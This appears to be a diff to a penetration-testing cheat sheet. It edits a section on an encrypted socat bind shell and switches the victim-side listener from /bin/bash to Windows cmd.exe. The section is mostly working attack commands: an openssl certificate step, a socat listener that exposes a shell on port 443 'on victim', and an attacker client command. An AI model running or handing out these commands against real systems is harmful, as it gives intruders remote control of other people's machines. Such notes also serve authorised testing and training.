@@ -28,7 +28,7 @@ The dash `-` is required to transfer keyboard data back and forth between the ma
 
 #### Encrypted bind shell
 
-To create an encrypted bind shell, first a self-signed certificate must be created.
+To create an encrypted bind shell, first a self-signed certificate must be created.  It must either be created on the victim machine, or transferred prior to using the bind shell.
 
 ```bash
 openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
@@ -37,16 +37,14 @@ cat bind_shell.key bind_shell.crt > bind_shell.pem
 
 This command will create a new 2048-bit encryption key and certificate using the RSA algorithm.  The certificate will be valid for 365 days.  The key and certifcate information must be combined into one .pem file using `cat`. &#x20;
 
-Next, use socat to create the bind shell using this .pem certificate.  `verify=0` will be used to disable SSL verification.  Since you are using SSL on port 443 you need to run the listener with `sudo`.
+Next, use socat to create the bind shell using this .pem certificate.  `verify=0` will be used to disable SSL verification.  Since you are using SSL on port 443 you need to run the listener with `sudo` if the victim machine is running Linux.
 
 ```bash
 #listener on victim
-sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+socat.exe OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:"C:\Windows\System32\cmd.exe"
 #attacker client
 socat - OPENSSL:$IP:443,verify=0
 ```
-
-This could also be used as a reverse shell if the client and listeners are switched.
 
 ## Reverse Shells
 
